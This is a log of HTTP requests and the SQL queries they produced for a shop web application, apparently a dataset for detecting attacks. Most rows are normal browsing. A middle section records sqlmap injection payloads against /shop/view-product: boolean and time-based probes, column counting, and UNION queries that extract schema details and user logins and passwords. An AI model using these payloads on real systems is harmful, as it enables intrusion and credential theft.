#REQUEST_METHOD|REQUEST_URI|REQUEST_HEADERS:User-Agent|sql:query|sql:ok|@timestamp
GET|/shop/index|Java/1.6.0_26|SELECT id,name,description,price,CONCAT('<a href="/shop/cart/add?id=', id, '">add</a>') FROM products|true|1318428150458
GET|/shop/search|Java/1.6.0_26|SELECT id,name,description,price FROM products WHERE name LIKE '%mobile phone%' OR description LIKE '%mobile phone%'|true|1318428150475
GET|/shop/cart/view|Java/1.6.0_26|SELECT productId,products.name,quantity,CONCAT('<a href="/shop/cart/remove?id=', productId, '">remove</a>') FROM cart LEFT JOIN products ON cart.productId=products.id WHERE session = '1hg1ekuvpigxp' |true|1318428150513
GET|/shop/cart/view|Java/1.6.0_26|SELECT COUNT(*),SUM(products.price) FROM cart LEFT JOIN products on cart.productId = products.id WHERE session = '1hg1ekuvpigxp'|true|1318428150519
GET|/shop/cart/view|Java/1.6.0_26|SELECT productId,products.name,quantity,CONCAT('<a href="/shop/cart/remove?id=', productId, '">remove</a>') FROM cart LEFT JOIN products ON cart.productId=products.id WHERE session = 'yxnnx46tm1yf' |true|1318428150531
GET|/shop/cart/view|Java/1.6.0_26|SELECT COUNT(*),SUM(products.price) FROM cart LEFT JOIN products on cart.productId = products.id WHERE session = 'yxnnx46tm1yf'|true|1318428150547
GET|/shop/index|Java/1.6.0_26|SELECT id,name,description,price,CONCAT('<a href="/shop/cart/add?id=', id, '">add</a>') FROM products|true|1318428150562
GET|/shop/search|Java/1.6.0_26|SELECT id,name,description,price FROM products WHERE name LIKE '%ABC%' OR description LIKE '%ABC%'|true|1318428150579
GET|/shop/cart/view|Java/1.6.0_26|SELECT productId,products.name,quantity,CONCAT('<a href="/shop/cart/remove?id=', productId, '">remove</a>') FROM cart LEFT JOIN products ON cart.productId=products.id WHERE session = 'cwcqkvcxeu11' |true|1318428150613
GET|/shop/cart/view|Java/1.6.0_26|SELECT COUNT(*),SUM(products.price) FROM cart LEFT JOIN products on cart.productId = products.id WHERE session = 'cwcqkvcxeu11'|true|1318428150620
GET|/shop/cart/view|Java/1.6.0_26|SELECT productId,products.name,quantity,CONCAT('<a href="/shop/cart/remove?id=', productId, '">remove</a>') FROM cart LEFT JOIN products ON cart.productId=products.id WHERE session = 'a772vinz3u4q' |true|1318428150631
GET|/shop/cart/view|Java/1.6.0_26|SELECT COUNT(*),SUM(products.price) FROM cart LEFT JOIN products on cart.productId = products.id WHERE session = 'a772vinz3u4q'|true|1318428150648
GET|/shop/view-product|Java/1.6.0_26|SELECT id,name,description,price FROM products WHERE id = 97|true|1318428150673
GET|/shop/view-product|Java/1.6.0_26|SELECT id,name,description,price FROM products WHERE id = 878|true|1318428150699
GET|/shop/index|Java/1.6.0_26|SELECT id,name,description,price,CONCAT('<a href="/shop/cart/add?id=', id, '">add</a>') FROM products|true|1318428150718
GET|/shop/index|Java/1.6.0_26|SELECT id,name,description,price,CONCAT('<a href="/shop/cart/add?id=', id, '">add</a>') FROM products|true|1318428150730
GET|/shop/search|Java/1.6.0_26|SELECT id,name,description,price FROM products WHERE name LIKE '%mobile phone%' OR description LIKE '%mobile phone%'|true|1318428150750
GET|/shop/view-product|Java/1.6.0_26|SELECT id,name,description,price FROM products WHERE id = 248|true|1318428150777
GET|/shop/view-product|Java/1.6.0_26|SELECT id,name,description,price FROM products WHERE id = 684|true|1318428150791
GET|/shop/cart/view|Java/1.6.0_26|SELECT productId,products.name,quantity,CONCAT('<a href="/shop/cart/remove?id=', productId, '">remove</a>') FROM cart LEFT JOIN products ON cart.productId=products.id WHERE session = '1tr45qyicn6fl' |true|1318428150819
GET|/shop/cart/view|Java/1.6.0_26|SELECT COUNT(*),SUM(products.price) FROM cart LEFT JOIN products on cart.productId = products.id WHERE session = '1tr45qyicn6fl'|true|1318428150825
GET|/shop/index|Java/1.6.0_26|SELECT id,name,description,price,CONCAT('<a href="/shop/cart/add?id=', id, '">add</a>') FROM products|true|1318428150869
GET|/shop/index|Java/1.6.0_26|SELECT id,name,description,price,CONCAT('<a href="/shop/cart/add?id=', id, '">add</a>') FROM products|true|1318428150891
GET|/shop/search|Java/1.6.0_26|SELECT id,name,description,price FROM products WHERE name LIKE '%mobile phone%' OR description LIKE '%mobile phone%'|true|1318428150919
GET|/shop/search|Java/1.6.0_26|SELECT id,name,description,price FROM products WHERE name LIKE '%%' OR description LIKE '%%'|true|1318428150951
GET|/shop/search|Java/1.6.0_26|SELECT id,name,description,price FROM products WHERE name LIKE '%ABC%' OR description LIKE '%ABC%'|true|1318428150974
GET|/shop/search|Java/1.6.0_26|SELECT id,name,description,price FROM products WHERE name LIKE '%tv%' OR description LIKE '%tv%'|true|1318428150995
GET|/shop/view-product|Java/1.6.0_26|SELECT id,name,description,price FROM products WHERE id = 387|true|1318428151007
GET|/shop/search|Java/1.6.0_26|SELECT id,name,description,price FROM products WHERE name LIKE '%mobile phone%' OR description LIKE '%mobile phone%'|true|1318428151046
GET|/shop/search|Java/1.6.0_26|SELECT id,name,description,price FROM products WHERE name LIKE '%%' OR description LIKE '%%'|true|1318428151065
GET|/shop/view-product|Java/1.6.0_26|SELECT id,name,description,price FROM products WHERE id = 675|true|1318428151077
GET|/shop/cart/view|Java/1.6.0_26|SELECT productId,products.name,quantity,CONCAT('<a href="/shop/cart/remove?id=', productId, '">remove</a>') FROM cart LEFT JOIN products ON cart.productId=products.id WHERE session = 'w57ovg30h0b5' |true|1318428151095
GET|/shop/cart/view|Java/1.6.0_26|SELECT COUNT(*),SUM(products.price) FROM cart LEFT JOIN products on cart.productId = products.id WHERE session = 'w57ovg30h0b5'|true|1318428151108
GET|/shop/search|Java/1.6.0_26|SELECT id,name,description,price FROM products WHERE name LIKE '%Tale of Brave Olysses%' OR description LIKE '%Tale of Brave Olysses%'|true|1318428151134
GET|/shop/cart/view|Java/1.6.0_26|SELECT productId,products.name,quantity,CONCAT('<a href="/shop/cart/remove?id=', productId, '">remove</a>') FROM cart LEFT JOIN products ON cart.productId=products.id WHERE session = '1soy9e3s7hydk' |true|1318428151183
GET|/shop/cart/view|Java/1.6.0_26|SELECT COUNT(*),SUM(products.price) FROM cart LEFT JOIN products on cart.productId = products.id WHERE session = '1soy9e3s7hydk'|true|1318428151189
GET|/shop/cart/view|Java/1.6.0_26|SELECT productId,products.name,quantity,CONCAT('<a href="/shop/cart/remove?id=', productId, '">remove</a>') FROM cart LEFT JOIN products ON cart.productId=products.id WHERE session = 'vf72g32931rg' |true|1318428151201
GET|/shop/cart/view|Java/1.6.0_26|SELECT COUNT(*),SUM(products.price) FROM cart LEFT JOIN products on cart.productId = products.id WHERE session = 'vf72g32931rg'|true|1318428151207
GET|/shop/search|Java/1.6.0_26|SELECT id,name,description,price FROM products WHERE name LIKE '%Tale of Brave Olysses%' OR description LIKE '%Tale of Brave Olysses%'|true|1318428151227
GET|/shop/cart/view|Java/1.6.0_26|SELECT productId,products.name,quantity,CONCAT('<a href="/shop/cart/remove?id=', productId, '">remove</a>') FROM cart LEFT JOIN products ON cart.productId=products.id WHERE session = '19f3ky05p0bvg' |true|1318428151248
GET|/shop/cart/view|Java/1.6.0_26|SELECT COUNT(*),SUM(products.price) FROM cart LEFT JOIN products on cart.productId = products.id WHERE session = '19f3ky05p0bvg'|true|1318428151255
GET|/shop/view-product|sqlmap/1.0-dev (r4405) (http://www.sqlmap.org)|SELECT id,name,description,price FROM products WHERE id = 2|true|1318428163846
GET|/shop/view-product|sqlmap/1.0-dev (r4405) (http://www.sqlmap.org)|SELECT id,name,description,price FROM products WHERE id = 2|true|1318428164934
GET|/shop/view-product|sqlmap/1.0-dev (r4405) (http://www.sqlmap.org)|SELECT id,name,description,price FROM products WHERE id = 271|true|1318428164998
GET|/shop/view-product|sqlmap/1.0-dev (r4405) (http://www.sqlmap.org)|SELECT id,name,description,price FROM products WHERE id = 6197|true|1318428165069
GET|/shop/view-product|sqlmap/1.0-dev (r4405) (http://www.sqlmap.org)|SELECT id,name,description,price FROM products WHERE id = 2)"')'''"")|false|1318428165142
GET|/shop/view-product|sqlmap/1.0-dev (r4405) (http://www.sqlmap.org)|SELECT id,name,description,price FROM products WHERE id = 2) AND 6298=7907 AND (2903=2903|false|1318428165177
GET|/shop/view-product|sqlmap/1.0-dev (r4405) (http://www.sqlmap.org)|SELECT id,name,description,price FROM products WHERE id = 2) AND 734=734 AND (1068=1068|false|1318428165203
GET|/shop/view-product|sqlmap/1.0-dev (r4405) (http://www.sqlmap.org)|SELECT id,name,description,price FROM products WHERE id = 2 AND 7099=9156|true|1318428165227
GET|/shop/view-product|sqlmap/1.0-dev (r4405) (http://www.sqlmap.org)|SELECT id,name,description,price FROM products WHERE id = 2 AND 734=734|true|1318428165255
GET|/shop/view-product|sqlmap/1.0-dev (r4405) (http://www.sqlmap.org)|SELECT id,name,description,price FROM products WHERE id = 2 AND 8215=8107|true|1318428165276
GET|/shop/view-product|sqlmap/1.0-dev (r4405) (http://www.sqlmap.org)|SELECT id,name,description,price FROM products WHERE id = 2 AND (SELECT 8762 FROM(SELECT COUNT(*),CONCAT(CHAR(58,101,104,101,58),(SELECT (CASE WHEN (8762=8762) THEN 1 ELSE 0 END)),CHAR(58,114,103,112,58),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)|false|1318428165296
GET|/shop/view-product|sqlmap/1.0-dev (r4405) (http://www.sqlmap.org)|SELECT id,name,description,price FROM products WHERE id = 2; SELECT SLEEP(5);-- |false|1318428165333
GET|/shop/view-product|sqlmap/1.0-dev (r4405) (http://www.sqlmap.org)|SELECT id,name,description,price FROM products WHERE id = 2 AND SLEEP(5)|true|1318428170373
GET|/shop/view-product|sqlmap/1.0-dev (r4405) (http://www.sqlmap.org)|SELECT id,name,description,price FROM products WHERE id = 2 AND SLEEP(5)|true|1318428175397
GET|/shop/view-product|sqlmap/1.0-dev (r4405) (http://www.sqlmap.org)|SELECT id,name,description,price FROM products WHERE id = -4034 ORDER BY 1#|true|1318428175419
GET|/shop/view-product|sqlmap/1.0-dev (r4405) (http://www.sqlmap.org)|SELECT id,name,description,price FROM products WHERE id = -8627 ORDER BY 2410#|false|1318428175471
GET|/shop/view-product|sqlmap/1.0-dev (r4405) (http://www.sqlmap.org)|SELECT id,name,description,price FROM products WHERE id = -4921 ORDER BY 10#|false|1318428175530
GET|/shop/view-product|sqlmap/1.0-dev (r4405) (http://www.sqlmap.org)|SELECT id,name,description,price FROM products WHERE id = -4590 ORDER BY 6#|false|1318428175563
GET|/shop/view-product|sqlmap/1.0-dev (r4405) (http://www.sqlmap.org)|SELECT id,name,description,price FROM products WHERE id = -7285 ORDER BY 4#|true|1318428175602
GET|/shop/view-product|sqlmap/1.0-dev (r4405) (http://www.sqlmap.org)|SELECT id,name,description,price FROM products WHERE id = -948 ORDER BY 5#|false|1318428175618
GET|/shop/view-product|sqlmap/1.0-dev (r4405) (http://www.sqlmap.org)|SELECT id,name,description,price FROM products WHERE id = 2 UNION ALL SELECT CONCAT(CHAR(58,101,104,101,58),IFNULL(CAST(CHAR(106,68,89,109,86,117,104,119,97,97) AS CHAR),CHAR(32)),CHAR(58,114,103,112,58)), NULL, NULL, NULL#|true|1318428175658
GET|/shop/view-product|sqlmap/1.0-dev (r4405) (http://www.sqlmap.org)|SELECT id,name,description,price FROM products WHERE id = -255 UNION ALL SELECT CONCAT(CHAR(58,101,104,101,58),IFNULL(CAST(CHAR(106,68,89,109,86,117,104,119,97,97) AS CHAR),CHAR(32)),CHAR(58,114,103,112,58)), NULL, NULL, NULL UNION ALL SELECT CONCAT(CHAR(58,101,104,101,58),IFNULL(CAST(CHAR(70,101,80,72,118,104,118,71,66,109) AS CHAR),CHAR(32)),CHAR(58,114,103,112,58)), NULL, NULL, NULL#|true|1318428175685
GET|/shop/view-product|sqlmap/1.0-dev (r4405) (http://www.sqlmap.org)|SELECT id,name,description,price FROM products WHERE id = 2|true|1318428189715
GET|/shop/view-product|sqlmap/1.0-dev (r4405) (http://www.sqlmap.org)|SELECT id,name,description,price FROM products WHERE id = 2 UNION ALL SELECT CONCAT(CHAR(58,101,104,101,58),IFNULL(CAST(DATABASE() AS CHAR),CHAR(32)),CHAR(58,114,103,112,58)), NULL, NULL, NULL#|true|1318428193444
GET|/shop/view-product|sqlmap/1.0-dev (r4405) (http://www.sqlmap.org)|SELECT id,name,description,price FROM products WHERE id = 2 UNION ALL SELECT CONCAT(CHAR(58,101,104,101,58),IFNULL(CAST(column_name AS CHAR),CHAR(32)),CHAR(97,112,114,103,106,105),IFNULL(CAST(column_type AS CHAR),CHAR(32)),CHAR(58,114,103,112,58)), NULL, NULL, NULL FROM information_schema.COLUMNS WHERE table_name=CHAR(85,83,69,82,83) AND table_schema=CHAR(97,112,112,100,98)#|true|1318428193534
GET|/shop/view-product|sqlmap/1.0-dev (r4405) (http://www.sqlmap.org)|SELECT id,name,description,price FROM products WHERE id = 2 UNION ALL SELECT CONCAT(CHAR(58,101,104,101,58),IFNULL(CAST(login AS CHAR),CHAR(32)),CHAR(97,112,114,103,106,105),IFNULL(CAST(password AS CHAR),CHAR(32)),CHAR(58,114,103,112,58)), NULL, NULL, NULL FROM USERS#|true|1318428193622
GET|/shop/view-product|sqlmap/1.0-dev (r4405) (http://www.sqlmap.org)|SELECT id,name,description,price FROM products WHERE id = 2 UNION ALL SELECT CONCAT(CHAR(58,101,104,101,58),IFNULL(CAST(column_name AS CHAR),CHAR(32)),CHAR(97,112,114,103,106,105),IFNULL(CAST(column_type AS CHAR),CHAR(32)),CHAR(58,114,103,112,58)), NULL, NULL, NULL FROM information_schema.COLUMNS WHERE table_name=CHAR(80,82,79,68,85,67,84,83) AND table_schema=CHAR(97,112,112,100,98)#|true|1318428199236
GET|/shop/view-product|sqlmap/1.0-dev (r4405) (http://www.sqlmap.org)|SELECT id,name,description,price FROM products WHERE id = 2 UNION ALL SELECT CONCAT(CHAR(58,101,104,101,58),IFNULL(CAST(description AS CHAR),CHAR(32)),CHAR(97,112,114,103,106,105),IFNULL(CAST(id AS CHAR),CHAR(32)),CHAR(97,112,114,103,106,105),IFNULL(CAST(name AS CHAR),CHAR(32)),CHAR(97,112,114,103,106,105),IFNULL(CAST(price AS CHAR),CHAR(32)),CHAR(58,114,103,112,58)), NULL, NULL, NULL FROM PRODUCTS#|true|1318428199294
GET|/shop/view-product|sqlmap/1.0-dev (r4405) (http://www.sqlmap.org)|SELECT id,name,description,price FROM products WHERE id = 2|true|1318428256368
GET|/shop/view-product|sqlmap/1.0-dev (r4405) (http://www.sqlmap.org)|SELECT id,name,description,price FROM products WHERE id = 2|true|1318428257456
GET|/shop/view-product|sqlmap/1.0-dev (r4405) (http://www.sqlmap.org)|SELECT id,name,description,price FROM products WHERE id = 2066|true|1318428257524
GET|/shop/view-product|sqlmap/1.0-dev (r4405) (http://www.sqlmap.org)|SELECT id,name,description,price FROM products WHERE id = 9378|true|1318428257627
GET|/shop/view-product|sqlmap/1.0-dev (r4405) (http://www.sqlmap.org)|SELECT id,name,description,price FROM products WHERE id = 2()"))'"("(|false|1318428257729
GET|/shop/view-product|sqlmap/1.0-dev (r4405) (http://www.sqlmap.org)|SELECT id,name,description,price FROM products WHERE id = 2) AND 9416=3892 AND (1083=1083|false|1318428257800
GET|/shop/view-product|sqlmap/1.0-dev (r4405) (http://www.sqlmap.org)|SELECT id,name,description,price FROM products WHERE id = 2) AND 1063=1063 AND (739=739|false|1318428257863
GET|/shop/view-product|sqlmap/1.0-dev (r4405) (http://www.sqlmap.org)|SELECT id,name,description,price FROM products WHERE id = 2 AND 9176=9847|true|1318428257906
GET|/shop/view-product|sqlmap/1.0-dev (r4405) (http://www.sqlmap.org)|SELECT id,name,description,price FROM products WHERE id = 2 AND 1063=1063|true|1318428257944
GET|/shop/view-product|sqlmap/1.0-dev (r4405) (http://www.sqlmap.org)|SELECT id,name,description,price FROM products WHERE id = 2 AND 7457=8242|true|1318428257994
GET|/shop/view-product|sqlmap/1.0-dev (r4405) (http://www.sqlmap.org)|SELECT id,name,description,price FROM products WHERE id = 2 AND (SELECT 9181 FROM(SELECT COUNT(*),CONCAT(CHAR(58,111,109,115,58),(SELECT (CASE WHEN (9181=9181) THEN 1 ELSE 0 END)),CHAR(58,101,98,109,58),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)|false|1318428258021
GET|/shop/view-product|sqlmap/1.0-dev (r4405) (http://www.sqlmap.org)|SELECT id,name,description,price FROM products WHERE id = 2; SELECT SLEEP(5);-- |false|1318428258100
GET|/shop/view-product|sqlmap/1.0-dev (r4405) (http://www.sqlmap.org)|SELECT id,name,description,price FROM products WHERE id = 2 AND SLEEP(5)|true|1318428263182
GET|/shop/view-product|sqlmap/1.0-dev (r4405) (http://www.sqlmap.org)|SELECT id,name,description,price FROM products WHERE id = 2 AND SLEEP(5)|true|1318428268202
GET|/shop/view-product|sqlmap/1.0-dev (r4405) (http://www.sqlmap.org)|SELECT id,name,description,price FROM products WHERE id = -6649 ORDER BY 1#|true|1318428268225
GET|/shop/view-product|sqlmap/1.0-dev (r4405) (http://www.sqlmap.org)|SELECT id,name,description,price FROM products WHERE id = -7161 ORDER BY 5835#|false|1318428268242
GET|/shop/view-product|sqlmap/1.0-dev (r4405) (http://www.sqlmap.org)|SELECT id,name,description,price FROM products WHERE id = -8680 ORDER BY 10#|false|1318428268282
GET|/shop/view-product|sqlmap/1.0-dev (r4405) (http://www.sqlmap.org)|SELECT id,name,description,price FROM products WHERE id = -903 ORDER BY 6#|false|1318428268322
GET|/shop/view-product|sqlmap/1.0-dev (r4405) (http://www.sqlmap.org)|SELECT id,name,description,price FROM products WHERE id = -6027 ORDER BY 4#|true|1318428268360
GET|/shop/view-product|sqlmap/1.0-dev (r4405) (http://www.sqlmap.org)|SELECT id,name,description,price FROM products WHERE id = -2875 ORDER BY 5#|false|1318428268379
GET|/shop/view-product|sqlmap/1.0-dev (r4405) (http://www.sqlmap.org)|SELECT id,name,description,price FROM products WHERE id = 2 UNION ALL SELECT NULL, NULL, NULL, CONCAT(CHAR(58,111,109,115,58),IFNULL(CAST(CHAR(73,68,114,86,109,115,67,111,97,79) AS CHAR),CHAR(32)),CHAR(58,101,98,109,58))#|true|1318428268421
GET|/shop/view-product|sqlmap/1.0-dev (r4405) (http://www.sqlmap.org)|SELECT id,name,description,price FROM products WHERE id = -2831 UNION ALL SELECT NULL, NULL, NULL, CONCAT(CHAR(58,111,109,115,58),IFNULL(CAST(CHAR(73,68,114,86,109,115,67,111,97,79) AS CHAR),CHAR(32)),CHAR(58,101,98,109,58)) UNION ALL SELECT NULL, NULL, NULL, CONCAT(CHAR(58,111,109,115,58),IFNULL(CAST(CHAR(69,67,75,99,79,85,101,83,65,69) AS CHAR),CHAR(32)),CHAR(58,101,98,109,58))#|true|1318428268454
GET|/shop/view-product|sqlmap/1.0-dev (r4405) (http://www.sqlmap.org)|SELECT id,name,description,price FROM products WHERE id = 2 UNION ALL SELECT NULL, NULL, NULL, CONCAT(CHAR(58,111,109,115,58),(CASE WHEN (CHAR(87)=UPPER(MID(@@version_compile_os,1,1))) THEN 1 ELSE 0 END),CHAR(58,101,98,109,58))#|true|1318428269762
GET|/shop/index|Java/1.6.0_26|SELECT id,name,description,price,CONCAT('<a href="/shop/cart/add?id=', id, '">add</a>') FROM products|true|1318428498479
GET|/shop/index|Java/1.6.0_26|SELECT id,name,description,price,CONCAT('<a href="/shop/cart/add?id=', id, '">add</a>') FROM products|true|1318428498498
GET|/shop/view-product|Java/1.6.0_26|SELECT id,name,description,price FROM products WHERE id = 696|true|1318428498532
GET|/shop/view-product|Java/1.6.0_26|SELECT id,name,description,price FROM products WHERE id = 827|true|1318428498560
GET|/shop/view-product|Java/1.6.0_26|SELECT id,name,description,price FROM products WHERE id = 248|true|1318428498580
GET|/shop/index|Java/1.6.0_26|SELECT id,name,description,price,CONCAT('<a href="/shop/cart/add?id=', id, '">add</a>') FROM products|true|1318428498621
GET|/shop/view-product|Java/1.6.0_26|SELECT id,name,description,price FROM products WHERE id = 977|true|1318428498638
GET|/shop/view-product|Java/1.6.0_26|SELECT id,name,description,price FROM products WHERE id = 661|true|1318428498663
GET|/shop/cart/view|Java/1.6.0_26|SELECT productId,products.name,quantity,CONCAT('<a href="/shop/cart/remove?id=', productId, '">remove</a>') FROM cart LEFT JOIN products ON cart.productId=products.id WHERE session = '3y96f8vyqcu5' |true|1318428498677
GET|/shop/cart/view|Java/1.6.0_26|SELECT COUNT(*),SUM(products.price) FROM cart LEFT JOIN products on cart.productId = products.id WHERE session = '3y96f8vyqcu5'|true|1318428498683
GET|/shop/view-product|Java/1.6.0_26|SELECT id,name,description,price FROM products WHERE id = 364|true|1318428498712
GET|/shop/search|Java/1.6.0_26|SELECT id,name,description,price FROM products WHERE name LIKE '%Tale of Brave Olysses%' OR description LIKE '%Tale of Brave Olysses%'|true|1318428498729
GET|/shop/index|Java/1.6.0_26|SELECT id,name,description,price,CONCAT('<a href="/shop/cart/add?id=', id, '">add</a>') FROM products|true|1318428498742
GET|/shop/search|Java/1.6.0_26|SELECT id,name,description,price FROM products WHERE name LIKE '%Tale of Brave Olysses%' OR description LIKE '%Tale of Brave Olysses%'|true|1318428498765
GET|/shop/view-product|Java/1.6.0_26|SELECT id,name,description,price FROM products WHERE id = 8|true|1318428498801
GET|/shop/view-product|Java/1.6.0_26|SELECT id,name,description,price FROM products WHERE id = 653|true|1318428498823
GET|/shop/search|Java/1.6.0_26|SELECT id,name,description,price FROM products WHERE name LIKE '%mobile phone%' OR description LIKE '%mobile phone%'|true|1318428498846
GET|/shop/view-product|Java/1.6.0_26|SELECT id,name,description,price FROM products WHERE id = 640|true|1318428498859
GET|/shop/view-product|Java/1.6.0_26|SELECT id,name,description,price FROM products WHERE id = 318|true|1318428498893
GET|/shop/cart/view|Java/1.6.0_26|SELECT productId,products.name,quantity,CONCAT('<a href="/shop/cart/remove?id=', productId, '">remove</a>') FROM cart LEFT JOIN products ON cart.productId=products.id WHERE session = '1h588r7zkg9sh' |true|1318428498919
GET|/shop/cart/view|Java/1.6.0_26|SELECT COUNT(*),SUM(products.price) FROM cart LEFT JOIN products on cart.productId = products.id WHERE session = '1h588r7zkg9sh'|true|1318428498926
GET|/shop/view-product|Java/1.6.0_26|SELECT id,name,description,price FROM products WHERE id = 100|true|1318428498941
GET|/shop/cart/view|Java/1.6.0_26|SELECT productId,products.name,quantity,CONCAT('<a href="/shop/cart/remove?id=', productId, '">remove</a>') FROM cart LEFT JOIN products ON cart.productId=products.id WHERE session = '14t5eajl755cu' |true|1318428498996
GET|/shop/cart/view|Java/1.6.0_26|SELECT COUNT(*),SUM(products.price) FROM cart LEFT JOIN products on cart.productId = products.id WHERE session = '14t5eajl755cu'|true|1318428499006
GET|/shop/cart/view|Java/1.6.0_26|SELECT productId,products.name,quantity,CONCAT('<a href="/shop/cart/remove?id=', productId, '">remove</a>') FROM cart LEFT JOIN products ON cart.productId=products.id WHERE session = '1kluze4pv30r9' |true|1318428499073
GET|/shop/cart/view|Java/1.6.0_26|SELECT COUNT(*),SUM(products.price) FROM cart LEFT JOIN products on cart.productId = products.id WHERE session = '1kluze4pv30r9'|true|1318428499093
GET|/shop/cart/view|Java/1.6.0_26|SELECT productId,products.name,quantity,CONCAT('<a href="/shop/cart/remove?id=', productId, '">remove</a>') FROM cart LEFT JOIN products ON cart.productId=products.id WHERE session = '1bxxfvsvuofd8' |true|1318428499111
GET|/shop/cart/view|Java/1.6.0_26|SELECT COUNT(*),SUM(products.price) FROM cart LEFT JOIN products on cart.productId = products.id WHERE session = '1bxxfvsvuofd8'|true|1318428499142
GET|/shop/search|Java/1.6.0_26|SELECT id,name,description,price FROM products WHERE name LIKE '%Tale of Brave Olysses%' OR description LIKE '%Tale of Brave Olysses%'|true|1318428499244
GET|/shop/cart/view|Java/1.6.0_26|SELECT productId,products.name,quantity,CONCAT('<a href="/shop/cart/remove?id=', productId, '">remove</a>') FROM cart LEFT JOIN products ON cart.productId=products.id WHERE session = '1qt1y07o41qfn' |true|1318428499261
GET|/shop/cart/view|Java/1.6.0_26|SELECT COUNT(*),SUM(products.price) FROM cart LEFT JOIN products on cart.productId = products.id WHERE session = '1qt1y07o41qfn'|true|1318428499278
GET|/shop/index|Java/1.6.0_26|SELECT id,name,description,price,CONCAT('<a href="/shop/cart/add?id=', id, '">add</a>') FROM products|true|1318428499294
GET|/shop/index|Java/1.6.0_26|SELECT id,name,description,price,CONCAT('<a href="/shop/cart/add?id=', id, '">add</a>') FROM products|true|1318428499307
GET|/shop/cart/view|Java/1.6.0_26|SELECT productId,products.name,quantity,CONCAT('<a href="/shop/cart/remove?id=', productId, '">remove</a>') FROM cart LEFT JOIN products ON cart.productId=products.id WHERE session = 'srsvypr94dqh' |true|1318428499326
GET|/shop/cart/view|Java/1.6.0_26|SELECT COUNT(*),SUM(products.price) FROM cart LEFT JOIN products on cart.productId = products.id WHERE session = 'srsvypr94dqh'|true|1318428499333
GET|/shop/cart/view|Java/1.6.0_26|SELECT productId,products.name,quantity,CONCAT('<a href="/shop/cart/remove?id=', productId, '">remove</a>') FROM cart LEFT JOIN products ON cart.productId=products.id WHERE session = 'dyl8sj6qk9bk' |true|1318428499367
GET|/shop/cart/view|Java/1.6.0_26|SELECT COUNT(*),SUM(products.price) FROM cart LEFT JOIN products on cart.productId = products.id WHERE session = 'dyl8sj6qk9bk'|true|1318428499373
GET|/shop/view-product|Java/1.6.0_26|SELECT id,name,description,price FROM products WHERE id = 549|true|1318428499390
GET|/shop/search|Java/1.6.0_26|SELECT id,name,description,price FROM products WHERE name LIKE '%Tale of Brave Olysses%' OR description LIKE '%Tale of Brave Olysses%'|true|1318428499417
GET|/shop/search|Java/1.6.0_26|SELECT id,name,description,price FROM products WHERE name LIKE '%Tale of Brave Olysses%' OR description LIKE '%Tale of Brave Olysses%'|true|1318428499440
GET|/shop/search|Java/1.6.0_26|SELECT id,name,description,price FROM products WHERE name LIKE '%mobile phone%' OR description LIKE '%mobile phone%'|true|1318428499467
GET|/shop/view-product|Java/1.6.0_26|SELECT id,name,description,price FROM products WHERE id = 270|true|1318428499515
GET|/shop/view-product|Java/1.6.0_26|SELECT id,name,description,price FROM products WHERE id = 483|true|1318428499540
GET|/shop/search|Java/1.6.0_26|SELECT id,name,description,price FROM products WHERE name LIKE '%tv%' OR description LIKE '%tv%'|true|1318428499566
GET|/shop/search|Java/1.6.0_26|SELECT id,name,description,price FROM products WHERE name LIKE '%%' OR description LIKE '%%'|true|1318428499585
GET|/shop/view-product|Java/1.6.0_26|SELECT id,name,description,price FROM products WHERE id = 58|true|1318428499643
GET|/shop/search|Java/1.6.0_26|SELECT id,name,description,price FROM products WHERE name LIKE '%mobile phone%' OR description LIKE '%mobile phone%'|true|1318428499664
GET|/shop/view-product|Java/1.6.0_26|SELECT id,name,description,price FROM products WHERE id = 190|true|1318428499695
GET|/shop/view-product|Java/1.6.0_26|SELECT id,name,description,price FROM products WHERE id = 22|true|1318428499741
GET|/shop/index|Java/1.6.0_26|SELECT id,name,description,price,CONCAT('<a href="/shop/cart/add?id=', id, '">add</a>') FROM products|true|1318428499767
GET|/shop/search|Java/1.6.0_26|SELECT id,name,description,price FROM products WHERE name LIKE '%Tale of Brave Olysses%' OR description LIKE '%Tale of Brave Olysses%'|true|1318428499796
GET|/shop/search|Java/1.6.0_26|SELECT id,name,description,price FROM products WHERE name LIKE '%playstation%' OR description LIKE '%playstation%'|true|1318428499812
GET|/shop/view-product|Java/1.6.0_26|SELECT id,name,description,price FROM products WHERE id = 787|true|1318428499840
